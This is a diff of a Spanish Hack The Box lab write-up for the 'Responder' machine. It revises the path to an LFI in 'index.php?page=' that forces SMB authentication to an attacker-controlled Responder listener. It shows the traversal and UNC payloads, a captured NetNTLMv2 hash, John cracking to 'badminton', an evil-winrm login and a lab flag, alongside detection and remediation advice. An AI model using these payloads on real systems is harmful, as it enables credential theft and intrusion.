@@ -5,129 +5,157 @@ tags:
   - tier-1
   - easy
   - windows
-  - llmnr
+  - forced-authentication
   - ntlmv2
-  - en-progreso
-ip:
+  - terminada
+ip: 10.129.93.154
 os: Windows
 difficulty: Easy
-status: en-progreso
+status: terminada
 tiempo: 1h 0m
 fecha_inicio: 2026-08-13
-fecha_completada: —
-puntos: 0
+fecha_completada: 2026-08-22
+puntos: 20
 mitre_tactics:
+  - Initial Access
   - Credential Access
 mitre_techniques:
-  - T1557.001
+  - T1190
+  - T1187
   - T1110.002
 ---
 # 🖥️ Responder — Windows — Easy (Tier 1)
 
 > [!info] Resumen
-> **IP:** `10.129.73.245
-` | **OS:** Windows | **Tier/Fase:** 1 | **Tiempo:** 1h 0m
-> LLMNR/NBT-NS poisoning con Responder captura el hash NTLMv2 del usuario `wley` — se crackea offline con hashcat para obtener la contraseña.
+> **IP:** `10.129.93.154` | **OS:** Windows | **Tier/Fase:** 1 | **Tiempo:** 1h 0m
+> LFI en `index.php?page=` (virtual host `unika.htb`) usada para forzar una autenticación SMB saliente hacia un host controlado por el atacante — Responder captura el hash NetNTLMv2 del usuario `Administrator`, se crackea offline con John the Ripper (`badminton`).
 
 ---
 
 ## 1. Reconocimiento
 
 ```bash
-nmap -sCV -p- --min-rate 5000 10.129.73.245 -oN nmap.txt
+nmap -sCV -p- --min-rate 5000 10.129.93.154 -oN nmap.txt
 ```
 
 | Puerto   | Servicio  | Versión                     | Hallazgo clave                                           |
 | -------- | --------- | --------------------------- | -------------------------------------------------------- |
-| 80/TCP   | http      | Apache httpd 2.4.52         | Sin hallazgo por resultados de Nmap.                     |
-| 5985/TCP | http      | Microsoft HTTPAPI httpd 2.0 | Sin hallazgo por resultados de Nmap.                     |
+| 80/TCP   | http      | Apache httpd 2.4.52         | Redirige por Host header → virtual host `unika.htb`     |
+| 5985/TCP | http      | Microsoft HTTPAPI httpd 2.0 | WinRM — objetivo post-credenciales                       |
 | 7680/tcp | pando-pub | -                           | Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows |
 
-**→ Vector:** No hay explotación directa por puerto — el vector es de red (poisoning), no un servicio vulnerable clásico.
+> [!note] IP reasignada
+> El escaneo inicial (13-ago) fue contra `10.129.73.245`; al retomar y resolver (22-ago) HTB había reasignado la instancia a `10.129.93.154` — normal tras una desconexión larga de la VPN/instancia. Revisar siempre la IP activa antes de reusar comandos de una sesión anterior.
+
+**→ Vector:** LFI en la aplicación web (puerto 80, tras descubrir el virtual host `unika.htb`), escalado a captura de hash NTLMv2 forzando autenticación SMB — no es un servicio vulnerable "de fábrica" ni poisoning pasivo de broadcast.
 
 ---
 
 ## 2. Explotación
 
-> Vector principal: LLMNR/NBT-NS Poisoning — captura pasiva de hash NTLMv2 (Responder) + cracking offline (hashcat)
+> Vector: LFI (`index.php?page=`) → Forced Authentication SMB vía UNC path → captura NetNTLMv2 con Responder → cracking offline (John) → WinRM
 
 ```bash
-# Paso 1: insertar el dominio local de unika.htb a la ip destino para que reconozca el sitio web, si no no entrará.
+# Paso 1: unika.htb no resuelve por DNS público — forzar virtual host localmente
 echo "10.129.93.154 unika.htb" | sudo tee -a /etc/hosts
 
-# Paso 2: Ver si el sitio web es vulnerable a LFI con la función include de php.
+# Paso 2: confirmar LFI en el parámetro page vía path traversal
 http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+# Éxito: se filtra el hosts real de la víctima → include() sin sanitizar
 
-# Paso 3: Ya si es vulnerable, mostrará el h+osts de la víctima.  Posteriormente, lanzar Responder en la interfaz de la VPN de HTB.
+# Paso 3: levantar Responder en la interfaz de la VPN de HTB (ANTES de disparar el trigger)
 sudo responder -I tun0
 
-# Paso 4: Hay que lanzar una petición SMB, aunque falle el include(), el intento de SMB ya ocurrió antes del fallo y Responder ya lo capturó. (OJO acá es la IP del túnel, no de la máquina víctima, si no el responder no capturará la autenticación SMB).
-http://unika.htb/?page=//10.129.93.154/whatever
+# Paso 4: forzar la autenticación SMB — usar la IP de tun0 (la propia), NO la IP de la víctima
+http://unika.htb/?page=//<IP_TUN0_ATACANTE>/whatever
+# El include() falla del lado del servidor (error PHP visible), pero el intento SMB
+# ya salió antes del fallo — Responder lo captura igual.
 
-#Paso 5: Hash capturado en:
-echo "Administrator::RESPONDER:c4943cd1c7169e71:F92B50A59CF6E832C53D08E0B65C37B6:01010000000000008008975D4E32DD01360AB05996E5B0C90000000002000800510031003000510001001E00570049004E002D0031003300520046003100360031004A0037004100410004003400570049004E002D0031003300520046003100360031004A003700410041002E0051003100300051002E004C004F00430041004C000300140051003100300051002E004C004F00430041004C000500140051003100300051002E004C004F00430041004C00070008008008975D4E32DD0106000400020000000800300030000000000000000100000000200000E070049E3B0F4EE410B10F8EEE18110FA0E01A58B4BA61E16A84A31ACAD2181B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310033000000000000000000" > hash.txt
+# Paso 5: hash capturado (guardar tal cual lo reporta Responder)
+echo "Administrator::RESPONDER:c4943cd1c7169e71:F92B50A59CF6E832C53D08E0B65C37B6:0101..." > hash.txt
 
-# Paso 6: crackear el hash con john. Nos dará usuario y contraseña si el crackero es exitoso.
-jhon -w=/usr/share/wordlists/rockyou.txt hash.txt 
+# Paso 6: crackear con John
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+# → badminton (Administrator)
 
-# Paso 7: Iniciar autenticación remota con WinRM / Evil-WinRM.
-evil-winrm -i 10.129.93.154 -u administrador -p badminton
+# Paso 7: WinRM con la credencial obtenida
+evil-winrm -i 10.129.93.154 -u Administrator -p badminton
 
-#paso 8: Navegar por los usuarios del sistema, se encontrará a mike, en el Desktop, estará el flag.txt
+# Paso 8: la flag NO está en el home del usuario autenticado — revisar Desktop de
+# otros usuarios del sistema. Se encuentra en C:\Users\mike\Desktop\flag.txt
 ```
 
-> [!success] Flag / Credencial obtenida
-> Usuario: `mike` | Password: `ea81b7afddd03efaa0945333ed147fac`
+> [!success] Credencial y Flag obtenidas
+> **Credencial:** `Administrator` / `badminton` (vía NetNTLMv2 forzado + cracking)
+> **Flag:** `ea81b7afddd03efaa0945333ed147fac` — en `C:\Users\mike\Desktop\flag.txt` (usuario mike, no Administrator)
 
 ---
 
 ## 3. Escalación de Privilegios
 
-N/A — el objetivo de Tier 1 es obtener la contraseña en texto plano vía cracking, no post-explotación adicional.
+N/A — el objetivo de Tier 1 es obtener la contraseña en texto plano vía cracking y usarla para autenticarse, no post-explotación adicional. La cuenta obtenida (Administrator) ya tiene privilegio administrativo completo.
 
 ---
 
 ## 4. MITRE ATT&CK
 
-| Táctica            | Técnica                                    | ID        | Uso en esta máquina                                  |
-| -------------------- | -------------------------------------------- | --------- | -------------------------------------------------------- |
-| Credential Access    | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | T1557.001 | Responder captura el hash NTLMv2 al responder falsamente a broadcasts de resolución de nombre |
-| Credential Access    | Brute Force: Password Cracking              | T1110.002 | hashcat offline contra el hash capturado |
+| Táctica         | Técnica                          | ID        | Uso en esta máquina                                                                 |
+| ---------------- | ---------------------------------- | --------- | -------------------------------------------------------------------------------------- |
+| Initial Access   | Exploit Public-Facing Application | T1190     | LFI sin sanitizar en `index.php?page=` de la app web                                  |
+| Credential Access | Forced Authentication             | T1187     | El LFI se usa para forzar un `include()` sobre un UNC path SMB, obligando al host Windows a autenticarse contra el servidor de Responder |
+| Credential Access | Brute Force: Password Cracking    | T1110.002 | John the Ripper offline contra el hash NetNTLMv2 capturado                             |
+
+> [!warning] Corrección de mapeo
+> La versión anterior de este writeup marcaba T1557.001 (LLMNR/NBT-NS Poisoning). Es incorrecto para esta máquina: T1557.001 aplica cuando el atacante responde pasivamente a broadcasts de resolución de nombres fallida. Aquí el atacante **forzó activamente** la autenticación especificando un UNC path exacto (`//IP_atacante/whatever`) vía el parámetro `page=` — eso es T1187 (Forced Authentication). Responder fue la herramienta de captura en ambos casos, pero el mecanismo de disparo es distinto y cambia la detección/remediación aplicable (ver sección 5).
 
 ---
 
 ## 5. Detección & Remediación
 
 **Blue Team detecta:**
-- Respuestas LLMNR/NBT-NS desde un host que no es el DNS/WINS legítimo de la red (anómalo por diseño — ningún host normal debería responder estas consultas)
-- Tráfico UDP 5355 (LLMNR) y 137 (NBT-NS) inusual entre estaciones de trabajo
-- Autenticaciones NTLM hacia hosts fuera del dominio o inventario conocido
+- Tráfico SMB (445) saliente desde un host de la red interna hacia una IP externa/no inventariada — un cliente Windows normal no inicia SMB hacia IPs arbitrarias de internet
+- Autenticaciones NTLM registradas con un nombre de servidor/dominio anómalo (`RESPONDER` en este caso, en vez del hostname real del DC)
+- En el servidor web: solicitudes a `index.php?page=` con payloads de path traversal (`../../`) o rutas UNC (`//`) en los logs de Apache
 
 **Remediación:**
-- Deshabilitar LLMNR (GPO: `Turn off Multicast Name Resolution`) y NBT-NS en adaptadores de red
-- Si no se pueden deshabilitar por dependencias legacy: segmentar red, monitorear con IDS reglas específicas de Responder/poisoning
-- Forzar SMB Signing para mitigar relay del hash capturado; políticas de contraseña fuertes para que el hash capturado no sea crackeable en tiempo razonable
+- Causa raíz: sanitizar/whitelistear el parámetro `page` (permitir solo valores de una lista fija: `english`, `french`, `german`) — sin esto, cualquier otra mitigación es un parche sobre el síntoma
+- Bloquear SMB saliente (445) hacia IPs fuera de la red interna en el firewall perimetral/del host — así, aunque el LFI siga vivo, no puede alcanzar un servidor SMB del atacante
+- Forzar SMB Signing para mitigar relay si un hash se llega a capturar de todos modos
+- Políticas de contraseña fuertes: `badminton` es una palabra de diccionario trivial — con una política real esto no se crackea en segundos
+
+> [!note] Ojo con la remediación genérica
+> Deshabilitar LLMNR/NBT-NS (la mitigación típica de "Responder poisoning") **no habría prevenido este ataque** — el atacante nunca dependió de un broadcast fallido, especificó la IP UNC directamente. Aplicar la mitigación equivocada da falsa sensación de seguridad.
 
 ---
 
 ## 6. Lecciones
 
-Se aprendió que en un sitio web hay que probar local file inclusion y existe la función include, que permite inyectar el FI en el servidor. En busca de si la ruta de los archivos que adopta la función include está literalmente en los archivos del servidor, sin permiso previo, se podría explotar por ahí una autenticación SMB en la URL para corresponder, capturar la autenticación SMB y después craquear con John el hash del Ntlm. Así que se podrían obtener las credenciales, autenticar por el servicio de WinRM y obtener acceso remoto a la máquina víctima
+- Un LFI (`include()` sin sanitizar) no solo sirve para leer archivos locales — apuntado a una ruta UNC (`//IP/recurso`) fuerza autenticación SMB saliente, aunque el `include()` en sí falle del lado del servidor.
+- La IP en el payload `page=//IP/whatever` es la del atacante (la interfaz `tun0`, no la IP de la víctima) — confundir esto deja a Responder escuchando indefinidamente sin capturar nada (bloqueo real documentado abajo).
+- Flag y credencial de acceso son datos distintos: la flag es un valor a reportar, no una contraseña de usuario — no mezclarlos en el reporte final (error propio en el primer borrador de este writeup).
 
 **Bloqueado:**
 
-| Fase | Causa                                                                                                                        | Fix                                                  |
-| ---- | ---------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------- |
-| 2    | El responder no capturaba el NTLM porque el ataque web al protocolo SMB la ip que le asignaba  era la de la máquina víctima. | Debe inyectarse después de ?page=//IP-TUNEL/whatever |
+| Fase | Causa                                                                          | Fix                                                    |
+| ---- | -------------------------------------------------------------------------------- | ----------------------------------------------------- |
+| 2    | Responder no capturaba nada — el payload `page=` apuntaba a la IP de la víctima, no a la IP de `tun0` del atacante | Usar `?page=//IP_TUNEL_ATACANTE/whatever`             |
 
+---
+
+## 7. ¿Qué vería un Threat Hunter?
+
+- Un SIEM con reglas de NTLM correlacionaría la autenticación capturada: usuario `Administrator` autenticándose contra un `NetBIOS/servername` (`RESPONDER`) que no corresponde a ningún DC/recurso inventariado en la red — señal de autenticación forzada, no de tráfico legítimo.
+- El log de Apache (`page=//IP/whatever`) es la evidencia más temprana y barata de detectar: cualquier valor de `page` que no sea uno de los 3 idiomas esperados debería generar alerta antes de que el ataque llegue a la fase SMB.
+- Sin monitoreo de SMB saliente (regla de firewall/IDS para 445 hacia fuera de la red), este ataque es completamente silencioso desde la perspectiva de red — la única superficie de detección real está en los logs de la aplicación web, no en el segmento de red.
 
 ---
 
 ## 8. Conexiones
 
 - Similar: `[[HTB/Sequel/Sequel]]` (credencial obtenida por medio indirecto, no exploit clásico)
+- Similar: `[[HTB/Appointment/Appointment]]` (explotación web — LFI vs SQLi, misma familia de vulnerabilidad de aplicación pública)
 - Siguiente nivel: máquinas de Fase 2 (Active Directory) — este es el primer contacto con captura de hash NTLM
-- Técnica: `[[Técnicas/LLMNR-NBTNS-Poisoning]]`
-- Teoría: [`Teoria_LLMNR_Responder`](obsidian://open?vault=RedTeamLab&file=HTB%2FResponder%2FTeoria_LLMNR_Responder.pdf)
+- Técnica: `[[Técnicas/Forced-Authentication-SMB]]`
+- Teoría: [`Teoria_LLMNR_Responder`](obsidian://open?vault=RedTeamLab&file=HTB%2FResponder%2FTeoria_LLMNR_Responder.pdf) · [`WriteUp_Oficial_Responder_ES`](obsidian://open?vault=RedTeamLab&file=HTB%2FResponder%2FWriteUp_Oficial_Responder_ES.pdf)
 
-**Referencias:** [HackTricks - LLMNR/NBT-NS Poisoning](https://book.hacktricks.xyz/windows-hardening/ad-information-in-windows/broadcast-llmnr-nbt-ns-mdns-spoofing) · [MITRE T1557.001](https://attack.mitre.org/techniques/T1557/001/)
+**Referencias:** [HackTricks - LLMNR/NBT-NS Poisoning](https://book.hacktricks.xyz/windows-hardening/ad-information-in-windows/broadcast-llmnr-nbt-ns-mdns-spoofing) · [MITRE T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/) · [MITRE T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
